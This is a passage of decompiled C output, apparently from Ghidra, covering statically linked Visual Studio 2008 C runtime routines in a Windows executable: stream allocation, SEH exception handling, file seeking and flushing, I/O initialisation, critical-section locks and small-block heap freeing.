      if (*pwVar10 != L'=') goto LAB_0040d5f1;
      do {
        pwVar9 = pwVar10;
        pwVar10 = pwVar9 + 1;
      } while (*pwVar10 == L' ');
      iVar7 = __wcsnicmp(pwVar10,u_UTF_8_0041c300,5);
      if (iVar7 == 0) {
        pwVar10 = pwVar9 + 6;
        _OpenFlag = _OpenFlag | 0x40000;
      }
      else {
        iVar7 = __wcsnicmp(pwVar10,u_UTF_16LE_0041c30c,8);
        if (iVar7 == 0) {
          pwVar10 = pwVar9 + 9;
          _OpenFlag = _OpenFlag | 0x20000;
        }
        else {
          iVar7 = __wcsnicmp(pwVar10,u_UNICODE_0041c320,7);
          if (iVar7 != 0) goto LAB_0040d5f1;
          pwVar10 = pwVar9 + 8;
          _OpenFlag = _OpenFlag | 0x10000;
        }
      }
    }
  }
  for (; *pwVar10 == L' '; pwVar10 = pwVar10 + 1) {
  }
  if (*pwVar10 == L'\0') {
    eVar8 = __wsopen_s((int *)&_Mode,_Filename,_OpenFlag,_ShFlag,0x180);
    if (eVar8 != 0) {
      return (FILE *)0x0;
    }
    _DAT_00423cf8 = _DAT_00423cf8 + 1;
    _File->_flag = local_8;
    _File->_cnt = 0;
    _File->_ptr = (char *)0x0;
    _File->_base = (char *)0x0;
    _File->_tmpfname = (char *)0x0;
    _File->_file = (int)_Mode;
    return _File;
  }
LAB_0040d5f1:
  piVar6 = __errno();
  *piVar6 = 0x16;
  __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  return (FILE *)0x0;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __getstream
// 
// Library: Visual Studio 2008 Release

FILE * __cdecl __getstream(void)

{
  int *piVar1;
  uint uVar2;
  int iVar3;
  void *pvVar4;
  BOOL BVar5;
  int iVar6;
  FILE *pFVar7;
  FILE *_File;
  
  pFVar7 = (FILE *)0x0;
  __lock(1);
  iVar6 = 0;
  do {
    _File = pFVar7;
    if (DAT_004268c0 <= iVar6) {
LAB_0040d966:
      if (_File != (FILE *)0x0) {
        _File->_flag = _File->_flag & 0x8000;
        _File->_cnt = 0;
        _File->_base = (char *)0x0;
        _File->_ptr = (char *)0x0;
        _File->_tmpfname = (char *)0x0;
        _File->_file = -1;
      }
      FUN_0040d997();
      return _File;
    }
    piVar1 = (int *)(DAT_004258a0 + iVar6 * 4);
    if (*piVar1 == 0) {
      iVar6 = iVar6 * 4;
      pvVar4 = __malloc_crt(0x38);
      *(void **)(iVar6 + DAT_004258a0) = pvVar4;
      if (*(int *)(DAT_004258a0 + iVar6) != 0) {
        BVar5 = ___crtInitCritSecAndSpinCount
                          ((LPCRITICAL_SECTION)(*(int *)(DAT_004258a0 + iVar6) + 0x20),4000);
        if (BVar5 == 0) {
          _free(*(void **)(iVar6 + DAT_004258a0));
          *(undefined4 *)(iVar6 + DAT_004258a0) = 0;
        }
        else {
          EnterCriticalSection((LPCRITICAL_SECTION)(*(int *)(iVar6 + DAT_004258a0) + 0x20));
          _File = *(FILE **)(iVar6 + DAT_004258a0);
          _File->_flag = 0;
        }
      }
      goto LAB_0040d966;
    }
    uVar2 = *(uint *)(*piVar1 + 0xc);
    if (((uVar2 & 0x83) == 0) && ((uVar2 & 0x8000) == 0)) {
      if ((iVar6 - 3U < 0x11) && (iVar3 = __mtinitlocknum(iVar6 + 0x10), iVar3 == 0))
      goto LAB_0040d966;
      __lock_file2(iVar6,*(void **)(DAT_004258a0 + iVar6 * 4));
      _File = *(FILE **)(DAT_004258a0 + iVar6 * 4);
      if ((*(byte *)&_File->_flag & 0x83) == 0) goto LAB_0040d966;
      __unlock_file2(iVar6,_File);
    }
    iVar6 = iVar6 + 1;
  } while( true );
}



void FUN_0040d997(void)

{
  FUN_0040e2eb(1);
  return;
}



// WARNING: This is an inlined function
// WARNING: Unable to track spacebase fully for stack
// WARNING: Variable defined which should be unmapped: param_2
// Library Function - Single Match
//  __SEH_prolog4
// 
// Library: Visual Studio

void __cdecl __SEH_prolog4(undefined4 param_1,int param_2)

{
  int iVar1;
  undefined4 unaff_EBX;
  undefined4 unaff_ESI;
  undefined4 unaff_EDI;
  undefined4 unaff_retaddr;
  uint auStack_1c [5];
  undefined local_8 [8];
  
  iVar1 = -param_2;
  *(undefined4 *)((int)auStack_1c + iVar1 + 0x10) = unaff_EBX;
  *(undefined4 *)((int)auStack_1c + iVar1 + 0xc) = unaff_ESI;
  *(undefined4 *)((int)auStack_1c + iVar1 + 8) = unaff_EDI;
  *(uint *)((int)auStack_1c + iVar1 + 4) = DAT_00422044 ^ (uint)&param_2;
  *(undefined4 *)((int)auStack_1c + iVar1) = unaff_retaddr;
  ExceptionList = local_8;
  return;
}



// WARNING: This is an inlined function
// Library Function - Single Match
//  __SEH_epilog4
// 
// Library: Visual Studio

void __SEH_epilog4(void)

{
  undefined4 *unaff_EBP;
  undefined4 unaff_retaddr;
  
  ExceptionList = (void *)unaff_EBP[-4];
  *unaff_EBP = unaff_retaddr;
  return;
}



// Library Function - Single Match
//  __except_handler4
// 
// Library: Visual Studio 2008 Release

undefined4 __cdecl __except_handler4(int *param_1,PVOID param_2,undefined4 param_3)

{
  int iVar1;
  int iVar2;
  BOOL BVar3;
  PVOID pvVar4;
  int *piVar5;
  int *local_1c;
  undefined4 local_18;
  PVOID *local_14;
  undefined4 local_10;
  PVOID local_c;
  char local_5;
  
  piVar5 = (int *)(*(uint *)((int)param_2 + 8) ^ DAT_00422044);
  local_5 = '\0';
  local_10 = 1;
  iVar1 = (int)param_2 + 0x10;
  if (*piVar5 != -2) {
    ___security_check_cookie_4(piVar5[1] + iVar1 ^ *(uint *)(*piVar5 + iVar1));
  }
  ___security_check_cookie_4(piVar5[3] + iVar1 ^ *(uint *)(piVar5[2] + iVar1));
  pvVar4 = param_2;
  if ((*(byte *)(param_1 + 1) & 0x66) == 0) {
    *(int ***)((int)param_2 + -4) = &local_1c;
    pvVar4 = *(PVOID *)((int)param_2 + 0xc);
    local_1c = param_1;
    local_18 = param_3;
    if (pvVar4 == (PVOID)0xfffffffe) {
      return local_10;
    }
    do {
      local_14 = (PVOID *)(piVar5 + (int)pvVar4 * 3 + 4);
      local_c = *local_14;
      if ((undefined *)piVar5[(int)pvVar4 * 3 + 5] != (undefined *)0x0) {
        iVar2 = __EH4_CallFilterFunc_8((undefined *)piVar5[(int)pvVar4 * 3 + 5]);
        local_5 = '\x01';
        if (iVar2 < 0) {
          local_10 = 0;
          goto LAB_0040daa8;
        }
        if (0 < iVar2) {
          if (((*param_1 == -0x1f928c9d) &&
              (PTR____DestructExceptionObject_00420070 != (undefined *)0x0)) &&
             (BVar3 = __IsNonwritableInCurrentImage((PBYTE)&PTR____DestructExceptionObject_00420070)
             , BVar3 != 0)) {
            (*(code *)PTR____DestructExceptionObject_00420070)(param_1,1);
          }
          __EH4_GlobalUnwind_4(param_2);
          if (*(PVOID *)((int)param_2 + 0xc) != pvVar4) {
            __EH4_LocalUnwind_16((int)param_2,(uint)pvVar4,iVar1,&DAT_00422044);
          }
          *(PVOID *)((int)param_2 + 0xc) = local_c;
          if (*piVar5 != -2) {
            ___security_check_cookie_4(piVar5[1] + iVar1 ^ *(uint *)(*piVar5 + iVar1));
          }
          ___security_check_cookie_4(piVar5[3] + iVar1 ^ *(uint *)(piVar5[2] + iVar1));
          __EH4_TransferToHandler_8((undefined *)local_14[2]);
          goto LAB_0040db6c;
        }
      }
      pvVar4 = local_c;
    } while (local_c != (PVOID)0xfffffffe);
    if (local_5 == '\0') {
      return local_10;
    }
  }
  else {
LAB_0040db6c:
    if (*(int *)((int)pvVar4 + 0xc) == -2) {
      return local_10;
    }
    __EH4_LocalUnwind_16((int)pvVar4,0xfffffffe,iVar1,&DAT_00422044);
  }
LAB_0040daa8:
  if (*piVar5 != -2) {
    ___security_check_cookie_4(piVar5[1] + iVar1 ^ *(uint *)(*piVar5 + iVar1));
  }
  ___security_check_cookie_4(piVar5[3] + iVar1 ^ *(uint *)(piVar5[2] + iVar1));
  return local_10;
}



// Library Function - Single Match
//  __local_unwind4
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release

void __cdecl __local_unwind4(uint *param_1,int param_2,uint param_3)

{
  undefined4 *puVar1;
  uint uVar2;
  void *pvStack_28;
  undefined *puStack_24;
  uint local_20;
  uint uStack_1c;
  int iStack_18;
  uint *puStack_14;
  
  puStack_14 = param_1;
  iStack_18 = param_2;
  uStack_1c = param_3;
  puStack_24 = &LAB_0040dc1c;
  pvStack_28 = ExceptionList;
  local_20 = DAT_00422044 ^ (uint)&pvStack_28;
  ExceptionList = &pvStack_28;
  while( true ) {
    uVar2 = *(uint *)(param_2 + 0xc);
    if ((uVar2 == 0xfffffffe) || ((param_3 != 0xfffffffe && (uVar2 <= param_3)))) break;
    puVar1 = (undefined4 *)((*(uint *)(param_2 + 8) ^ *param_1) + 0x10 + uVar2 * 0xc);
    *(undefined4 *)(param_2 + 0xc) = *puVar1;
    if (puVar1[1] == 0) {
      __NLG_Notify(0x101);
      FUN_004146c4();
    }
  }
  ExceptionList = pvStack_28;
  return;
}



void FUN_0040dc62(int param_1)

{
  __local_unwind4(*(uint **)(param_1 + 0x28),*(int *)(param_1 + 0x18),*(uint *)(param_1 + 0x1c));
  return;
}



// Library Function - Single Match
//  @_EH4_CallFilterFunc@8
// 
// Library: Visual Studio 2008 Release

void __fastcall __EH4_CallFilterFunc_8(undefined *param_1)

{
  (*(code *)param_1)();
  return;
}



// Library Function - Single Match
//  @_EH4_TransferToHandler@8
// 
// Library: Visual Studio 2008 Release

void __fastcall __EH4_TransferToHandler_8(undefined *UNRECOVERED_JUMPTABLE)

{
  __NLG_Notify(1);
                    // WARNING: Could not recover jumptable at 0x0040dcac. Too many branches
                    // WARNING: Treating indirect jump as call
  (*(code *)UNRECOVERED_JUMPTABLE)();
  return;
}



// Library Function - Single Match
//  @_EH4_GlobalUnwind@4
// 
// Library: Visual Studio 2008 Release

void __fastcall __EH4_GlobalUnwind_4(PVOID param_1)

{
  RtlUnwind(param_1,(PVOID)0x40dcc3,(PEXCEPTION_RECORD)0x0,(PVOID)0x0);
  return;
}



// Library Function - Single Match
//  @_EH4_LocalUnwind@16
// 
// Library: Visual Studio 2008 Release

void __fastcall __EH4_LocalUnwind_16(int param_1,uint param_2,undefined4 param_3,uint *param_4)

{
  __local_unwind4(param_4,param_1,param_2);
  return;
}



// Library Function - Single Match
//  __lseek_nolock
// 
// Library: Visual Studio 2008 Release

long __cdecl __lseek_nolock(int _FileHandle,long _Offset,int _Origin)

{
  byte *pbVar1;
  HANDLE hFile;
  int *piVar2;
  DWORD DVar3;
  ulong uVar4;
  
  hFile = (HANDLE)__get_osfhandle(_FileHandle);
  if (hFile == (HANDLE)0xffffffff) {
    piVar2 = __errno();
    *piVar2 = 9;
    DVar3 = 0xffffffff;
  }
  else {
    DVar3 = SetFilePointer(hFile,_Offset,(PLONG)0x0,_Origin);
    if (DVar3 == 0xffffffff) {
      uVar4 = GetLastError();
    }
    else {
      uVar4 = 0;
    }
    if (uVar4 == 0) {
      pbVar1 = (byte *)((&DAT_004257a0)[_FileHandle >> 5] + 4 + (_FileHandle & 0x1fU) * 0x40);
      *pbVar1 = *pbVar1 & 0xfd;
    }
    else {
      __dosmaperr(uVar4);
      DVar3 = 0xffffffff;
    }
  }
  return DVar3;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __lseek
// 
// Library: Visual Studio 2008 Release

long __cdecl __lseek(int _FileHandle,long _Offset,int _Origin)

{
  ulong *puVar1;
  int *piVar2;
  int iVar3;
  long local_20;
  
  if (_FileHandle == -2) {
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
  }
  else {
    if ((-1 < _FileHandle) && ((uint)_FileHandle < DAT_00425788)) {
      iVar3 = (_FileHandle & 0x1fU) * 0x40;
      if ((*(byte *)((&DAT_004257a0)[_FileHandle >> 5] + 4 + iVar3) & 1) != 0) {
        ___lock_fhandle(_FileHandle);
        if ((*(byte *)((&DAT_004257a0)[_FileHandle >> 5] + 4 + iVar3) & 1) == 0) {
          piVar2 = __errno();
          *piVar2 = 9;
          puVar1 = ___doserrno();
          *puVar1 = 0;
          local_20 = -1;
        }
        else {
          local_20 = __lseek_nolock(_FileHandle,_Offset,_Origin);
        }
        FUN_0040de26();
        return local_20;
      }
    }
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  return -1;
}



void FUN_0040de26(void)

{
  int unaff_EBP;
  
  __unlock_fhandle(*(int *)(unaff_EBP + 8));
  return;
}



// Library Function - Single Match
//  __fileno
// 
// Library: Visual Studio 2008 Release

int __cdecl __fileno(FILE *_File)

{
  int *piVar1;
  int iVar2;
  
  if (_File == (FILE *)0x0) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    iVar2 = -1;
  }
  else {
    iVar2 = _File->_file;
  }
  return iVar2;
}



// Library Function - Single Match
//  __flush
// 
// Library: Visual Studio 2008 Release

int __cdecl __flush(FILE *_File)

{
  int _FileHandle;
  uint uVar1;
  int iVar2;
  uint uVar3;
  char *_Buf;
  
  iVar2 = 0;
  if ((((byte)_File->_flag & 3) == 2) && ((_File->_flag & 0x108U) != 0)) {
    _Buf = _File->_base;
    uVar3 = (int)_File->_ptr - (int)_Buf;
    if (0 < (int)uVar3) {
      uVar1 = uVar3;
      _FileHandle = __fileno(_File);
      uVar1 = __write(_FileHandle,_Buf,uVar1);
      if (uVar1 == uVar3) {
        if ((char)_File->_flag < '\0') {
          _File->_flag = _File->_flag & 0xfffffffd;
        }
      }
      else {
        _File->_flag = _File->_flag | 0x20;
        iVar2 = -1;
      }
    }
  }
  _File->_cnt = 0;
  _File->_ptr = _File->_base;
  return iVar2;
}



// Library Function - Single Match
//  __fflush_nolock
// 
// Library: Visual Studio 2008 Release

int __cdecl __fflush_nolock(FILE *_File)

{
  int iVar1;
  
  if (_File == (FILE *)0x0) {
    iVar1 = _flsall(0);
  }
  else {
    iVar1 = __flush(_File);
    if (iVar1 == 0) {
      if ((_File->_flag & 0x4000U) == 0) {
        iVar1 = 0;
      }
      else {
        iVar1 = __fileno(_File);
        iVar1 = __commit(iVar1);
        iVar1 = -(uint)(iVar1 != 0);
      }
    }
    else {
      iVar1 = -1;
    }
  }
  return iVar1;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  _flsall
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

int __cdecl _flsall(int param_1)

{
  void **ppvVar1;
  void *_File;
  FILE *_File_00;
  int iVar2;
  int _Index;
  int local_28;
  int local_20;
  
  local_20 = 0;
  local_28 = 0;
  __lock(1);
  for (_Index = 0; _Index < DAT_004268c0; _Index = _Index + 1) {
    ppvVar1 = (void **)(DAT_004258a0 + _Index * 4);
    if ((*ppvVar1 != (void *)0x0) && (_File = *ppvVar1, (*(byte *)((int)_File + 0xc) & 0x83) != 0))
    {
      __lock_file2(_Index,_File);
      _File_00 = *(FILE **)(DAT_004258a0 + _Index * 4);
      if ((_File_00->_flag & 0x83U) != 0) {
        if (param_1 == 1) {
          iVar2 = __fflush_nolock(_File_00);
          if (iVar2 != -1) {
            local_20 = local_20 + 1;
          }
        }
        else if ((param_1 == 0) && ((_File_00->_flag & 2U) != 0)) {
          iVar2 = __fflush_nolock(_File_00);
          if (iVar2 == -1) {
            local_28 = -1;
          }
        }
      }
      FUN_0040dfb4();
    }
  }
  FUN_0040dfe3();
  if (param_1 != 1) {
    local_20 = local_28;
  }
  return local_20;
}



void FUN_0040dfb4(void)

{
  int unaff_ESI;
  
  __unlock_file2(unaff_ESI,*(void **)(DAT_004258a0 + unaff_ESI * 4));
  return;
}



void FUN_0040dfe3(void)

{
  FUN_0040e2eb(1);
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __ioinit
// 
// Library: Visual Studio 2008 Release

int __cdecl __ioinit(void)

{
  undefined4 *puVar1;
  undefined4 *puVar2;
  DWORD DVar3;
  BOOL BVar4;
  HANDLE pvVar5;
  UINT *pUVar6;
  int iVar7;
  HANDLE *ppvVar8;
  UINT UVar9;
  UINT UVar10;
  _STARTUPINFOA local_68;
  uint local_24;
  HANDLE *local_20;
  undefined4 uStack_c;
  undefined4 local_8;
  
  uStack_c = 0x40e001;
  local_8 = 0;
  GetStartupInfoA(&local_68);
  local_8 = 0xfffffffe;
  puVar2 = (undefined4 *)__calloc_crt(0x20,0x40);
  if (puVar2 == (undefined4 *)0x0) {
LAB_0040e240:
    iVar7 = -1;
  }
  else {
    DAT_00425788 = 0x20;
    DAT_004257a0 = puVar2;
    for (; puVar2 < DAT_004257a0 + 0x200; puVar2 = puVar2 + 0x10) {
      *(undefined *)(puVar2 + 1) = 0;
      *puVar2 = 0xffffffff;
      *(undefined *)((int)puVar2 + 5) = 10;
      puVar2[2] = 0;
      *(undefined *)(puVar2 + 9) = 0;
      *(undefined *)((int)puVar2 + 0x25) = 10;
      *(undefined *)((int)puVar2 + 0x26) = 10;
      puVar2[0xe] = 0;
      *(undefined *)(puVar2 + 0xd) = 0;
    }
    if ((local_68.cbReserved2 != 0) && ((UINT *)local_68.lpReserved2 != (UINT *)0x0)) {
      UVar9 = *(UINT *)local_68.lpReserved2;
      pUVar6 = (UINT *)((int)local_68.lpReserved2 + 4);
      local_20 = (HANDLE *)((int)pUVar6 + UVar9);
      if (0x7ff < (int)UVar9) {
        UVar9 = 0x800;
      }
      local_24 = 1;
      while ((UVar10 = UVar9, (int)DAT_00425788 < (int)UVar9 &&
             (puVar2 = (undefined4 *)__calloc_crt(0x20,0x40), UVar10 = DAT_00425788,
             puVar2 != (undefined4 *)0x0))) {
        (&DAT_004257a0)[local_24] = puVar2;
        DAT_00425788 = DAT_00425788 + 0x20;
        puVar1 = puVar2;
        for (; puVar2 < puVar1 + 0x200; puVar2 = puVar2 + 0x10) {
          *(undefined *)(puVar2 + 1) = 0;
          *puVar2 = 0xffffffff;
          *(undefined *)((int)puVar2 + 5) = 10;
          puVar2[2] = 0;
          *(byte *)(puVar2 + 9) = *(byte *)(puVar2 + 9) & 0x80;
          *(undefined *)((int)puVar2 + 0x25) = 10;
          *(undefined *)((int)puVar2 + 0x26) = 10;
          puVar2[0xe] = 0;
          *(undefined *)(puVar2 + 0xd) = 0;
          puVar1 = (&DAT_004257a0)[local_24];
        }
        local_24 = local_24 + 1;
      }
      local_24 = 0;
      if (0 < (int)UVar10) {
        do {
          pvVar5 = *local_20;
          if ((((pvVar5 != (HANDLE)0xffffffff) && (pvVar5 != (HANDLE)0xfffffffe)) &&
              ((*(byte *)pUVar6 & 1) != 0)) &&
             (((*(byte *)pUVar6 & 8) != 0 || (DVar3 = GetFileType(pvVar5), DVar3 != 0)))) {
            ppvVar8 = (HANDLE *)
                      ((local_24 & 0x1f) * 0x40 + (int)(&DAT_004257a0)[(int)local_24 >> 5]);
            *ppvVar8 = *local_20;
            *(byte *)(ppvVar8 + 1) = *(byte *)pUVar6;
            BVar4 = ___crtInitCritSecAndSpinCount((LPCRITICAL_SECTION)(ppvVar8 + 3),4000);
            if (BVar4 == 0) goto LAB_0040e240;
            ppvVar8[2] = (HANDLE)((int)ppvVar8[2] + 1);
          }
          local_24 = local_24 + 1;
          pUVar6 = (UINT *)((int)pUVar6 + 1);
          local_20 = local_20 + 1;
        } while ((int)local_24 < (int)UVar10);
      }
    }
    iVar7 = 0;
    do {
      ppvVar8 = (HANDLE *)(DAT_004257a0 + iVar7 * 0x10);
      if ((*ppvVar8 == (HANDLE)0xffffffff) || (*ppvVar8 == (HANDLE)0xfffffffe)) {
        *(undefined *)(ppvVar8 + 1) = 0x81;
        if (iVar7 == 0) {
          DVar3 = 0xfffffff6;
        }
        else {
          DVar3 = 0xfffffff5 - (iVar7 != 1);
        }
        pvVar5 = GetStdHandle(DVar3);
        if (((pvVar5 == (HANDLE)0xffffffff) || (pvVar5 == (HANDLE)0x0)) ||
           (DVar3 = GetFileType(pvVar5), DVar3 == 0)) {
          *(byte *)(ppvVar8 + 1) = *(byte *)(ppvVar8 + 1) | 0x40;
          *ppvVar8 = (HANDLE)0xfffffffe;
        }
        else {
          *ppvVar8 = pvVar5;
          if ((DVar3 & 0xff) == 2) {
            *(byte *)(ppvVar8 + 1) = *(byte *)(ppvVar8 + 1) | 0x40;
          }
          else if ((DVar3 & 0xff) == 3) {
            *(byte *)(ppvVar8 + 1) = *(byte *)(ppvVar8 + 1) | 8;
          }
          BVar4 = ___crtInitCritSecAndSpinCount((LPCRITICAL_SECTION)(ppvVar8 + 3),4000);
          if (BVar4 == 0) goto LAB_0040e240;
          ppvVar8[2] = (HANDLE)((int)ppvVar8[2] + 1);
        }
      }
      else {
        *(byte *)(ppvVar8 + 1) = *(byte *)(ppvVar8 + 1) | 0x80;
      }
      iVar7 = iVar7 + 1;
    } while (iVar7 < 3);
    SetHandleCount(DAT_00425788);
    iVar7 = 0;
  }
  return iVar7;
}



// Library Function - Single Match
//  __mtinitlocks
// 
// Library: Visual Studio 2008 Release

int __cdecl __mtinitlocks(void)

{
  BOOL BVar1;
  int iVar2;
  LPCRITICAL_SECTION p_Var3;
  
  iVar2 = 0;
  p_Var3 = (LPCRITICAL_SECTION)&DAT_00423d00;
  do {
    if ((&DAT_0042248c)[iVar2 * 2] == 1) {
      (&DAT_00422488)[iVar2 * 2] = p_Var3;
      p_Var3 = p_Var3 + 1;
      BVar1 = ___crtInitCritSecAndSpinCount((LPCRITICAL_SECTION)(&DAT_00422488)[iVar2 * 2],4000);
      if (BVar1 == 0) {
        (&DAT_00422488)[iVar2 * 2] = 0;
        return 0;
      }
    }
    iVar2 = iVar2 + 1;
  } while (iVar2 < 0x24);
  return 1;
}



// Library Function - Single Match
//  __mtdeletelocks
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release

void __cdecl __mtdeletelocks(void)

{
  LPCRITICAL_SECTION lpCriticalSection;
  LPCRITICAL_SECTION *pp_Var1;
  
  pp_Var1 = (LPCRITICAL_SECTION *)&DAT_00422488;
  do {
    lpCriticalSection = *pp_Var1;
    if ((lpCriticalSection != (LPCRITICAL_SECTION)0x0) && (pp_Var1[1] != (LPCRITICAL_SECTION)0x1)) {
      DeleteCriticalSection(lpCriticalSection);
      _free(lpCriticalSection);
      *pp_Var1 = (LPCRITICAL_SECTION)0x0;
    }
    pp_Var1 = pp_Var1 + 2;
  } while ((int)pp_Var1 < 0x4225a8);
  pp_Var1 = (LPCRITICAL_SECTION *)&DAT_00422488;
  do {
    if ((*pp_Var1 != (LPCRITICAL_SECTION)0x0) && (pp_Var1[1] == (LPCRITICAL_SECTION)0x1)) {
      DeleteCriticalSection(*pp_Var1);
    }
    pp_Var1 = pp_Var1 + 2;
  } while ((int)pp_Var1 < 0x4225a8);
  return;
}



void __cdecl FUN_0040e2eb(int param_1)

{
  LeaveCriticalSection((LPCRITICAL_SECTION)(&DAT_00422488)[param_1 * 2]);
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __mtinitlocknum
// 
// Library: Visual Studio 2008 Release

int __cdecl __mtinitlocknum(int _LockNum)

{
  LPCRITICAL_SECTION *pp_Var1;
  LPCRITICAL_SECTION _Memory;
  int *piVar2;
  BOOL BVar3;
  int iVar4;
  int local_20;
  
  iVar4 = 1;
  local_20 = 1;
  if (DAT_00423e54 == 0) {
    __FF_MSGBANNER();
    __NMSG_WRITE(0x1e);
    ___crtExitProcess(0xff);
  }
  pp_Var1 = (LPCRITICAL_SECTION *)(&DAT_00422488 + _LockNum * 2);
  if (*pp_Var1 == (LPCRITICAL_SECTION)0x0) {
    _Memory = (LPCRITICAL_SECTION)__malloc_crt(0x18);
    if (_Memory == (LPCRITICAL_SECTION)0x0) {
      piVar2 = __errno();
      *piVar2 = 0xc;
      iVar4 = 0;
    }
    else {
      __lock(10);
      if (*pp_Var1 == (LPCRITICAL_SECTION)0x0) {
        BVar3 = ___crtInitCritSecAndSpinCount(_Memory,4000);
        if (BVar3 == 0) {
          _free(_Memory);
          piVar2 = __errno();
          *piVar2 = 0xc;
          local_20 = 0;
        }
        else {
          *pp_Var1 = _Memory;
        }
      }
      else {
        _free(_Memory);
      }
      FUN_0040e3bc();
      iVar4 = local_20;
    }
  }
  return iVar4;
}



void FUN_0040e3bc(void)

{
  FUN_0040e2eb(10);
  return;
}



// Library Function - Single Match
//  __lock
// 
// Library: Visual Studio 2008 Release

void __cdecl __lock(int _File)

{
  int iVar1;
  
  if ((LPCRITICAL_SECTION)(&DAT_00422488)[_File * 2] == (LPCRITICAL_SECTION)0x0) {
    iVar1 = __mtinitlocknum(_File);
    if (iVar1 == 0) {
      __amsg_exit(0x11);
    }
  }
  EnterCriticalSection((LPCRITICAL_SECTION)(&DAT_00422488)[_File * 2]);
  return;
}



// Library Function - Single Match
//  ___sbh_find_block
// 
// Library: Visual Studio 2008 Release

uint __cdecl ___sbh_find_block(int param_1)

{
  uint uVar1;
  
  uVar1 = DAT_00425774;
  while( true ) {
    if (DAT_00425770 * 0x14 + DAT_00425774 <= uVar1) {
      return 0;
    }
    if ((uint)(param_1 - *(int *)(uVar1 + 0xc)) < 0x100000) break;
    uVar1 = uVar1 + 0x14;
  }
  return uVar1;
}



// Library Function - Single Match
//  ___sbh_free_block
// 
// Library: Visual Studio 2008 Release

void __cdecl ___sbh_free_block(uint *param_1,int param_2)

{
  int *piVar1;
  char *pcVar2;
  uint *puVar3;
  int *piVar4;
  char cVar5;
  uint uVar6;
  uint uVar7;
  byte bVar8;
  uint uVar9;
  uint *puVar10;
  uint *puVar11;
  uint *puVar12;
  uint uVar13;
  uint uVar14;
  uint local_8;
  
  uVar6 = param_1[4];
  puVar12 = (uint *)(param_2 + -4);
  uVar14 = param_2 - param_1[3] >> 0xf;
  piVar4 = (int *)(uVar14 * 0x204 + 0x144 + uVar6);
  local_8 = *puVar12 - 1;
  if ((local_8 & 1) == 0) {
    puVar10 = (uint *)(local_8 + (int)puVar12);
    uVar13 = *puVar10;
    uVar7 = *(uint *)(param_2 + -8);
    if ((uVar13 & 1) == 0) {
      uVar9 = ((int)uVar13 >> 4) - 1;
      if (0x3f < uVar9) {
        uVar9 = 0x3f;
      }
      if (puVar10[1] == puVar10[2]) {
        if (uVar9 < 0x20) {
          pcVar2 = (char *)(uVar9 + 4 + uVar6);
          uVar9 = ~(0x80000000U >> ((byte)uVar9 & 0x1f));
          puVar11 = (uint *)(uVar6 + 0x44 + uVar14 * 4);
          *puVar11 = *puVar11 & uVar9;
          *pcVar2 = *pcVar2 + -1;
          if (*pcVar2 == '\0') {
            *param_1 = *param_1 & uVar9;
          }
        }
        else {
          pcVar2 = (char *)(uVar9 + 4 + uVar6);
          uVar9 = ~(0x80000000U >> ((byte)uVar9 - 0x20 & 0x1f));
          puVar11 = (uint *)(uVar6 + 0xc4 + uVar14 * 4);
          *puVar11 = *puVar11 & uVar9;
          *pcVar2 = *pcVar2 + -1;
          if (*pcVar2 == '\0') {
            param_1[1] = param_1[1] & uVar9;
          }
        }
      }
      local_8 = local_8 + uVar13;
      *(uint *)(puVar10[2] + 4) = puVar10[1];
      *(uint *)(puVar10[1] + 8) = puVar10[2];
    }
    puVar10 = (uint *)(((int)local_8 >> 4) - 1);
    if ((uint *)0x3f < puVar10) {
      puVar10 = (uint *)0x3f;
    }
    puVar11 = param_1;
    if ((uVar7 & 1) == 0) {
      puVar12 = (uint *)((int)puVar12 - uVar7);
      puVar11 = (uint *)(((int)uVar7 >> 4) - 1);
      if ((uint *)0x3f < puVar11) {
        puVar11 = (uint *)0x3f;
      }
      local_8 = local_8 + uVar7;
      puVar10 = (uint *)(((int)local_8 >> 4) - 1);
      if ((uint *)0x3f < puVar10) {
        puVar10 = (uint *)0x3f;
      }
      if (puVar11 != puVar10) {
        if (puVar12[1] == puVar12[2]) {
          if (puVar11 < (uint *)0x20) {
            uVar13 = ~(0x80000000U >> ((byte)puVar11 & 0x1f));
            puVar3 = (uint *)(uVar6 + 0x44 + uVar14 * 4);
            *puVar3 = *puVar3 & uVar13;
            pcVar2 = (char *)((int)puVar11 + uVar6 + 4);
            *pcVar2 = *pcVar2 + -1;
            if (*pcVar2 == '\0') {
              *param_1 = *param_1 & uVar13;
            }
          }
          else {
            uVar13 = ~(0x80000000U >> ((byte)puVar11 - 0x20 & 0x1f));
            puVar3 = (uint *)(uVar6 + 0xc4 + uVar14 * 4);
            *puVar3 = *puVar3 & uVar13;
            pcVar2 = (char *)((int)puVar11 + uVar6 + 4);
            *pcVar2 = *pcVar2 + -1;
            if (*pcVar2 == '\0') {
              param_1[1] = param_1[1] & uVar13;
            }
          }
        }
        *(uint *)(puVar12[2] + 4) = puVar12[1];
        *(uint *)(puVar12[1] + 8) = puVar12[2];
      }
    }
    if (((uVar7 & 1) != 0) || (puVar11 != puVar10)) {
      piVar1 = piVar4 + (int)puVar10 * 2;
      uVar13 = piVar1[1];
      puVar12[2] = (uint)piVar1;
      puVar12[1] = uVar13;
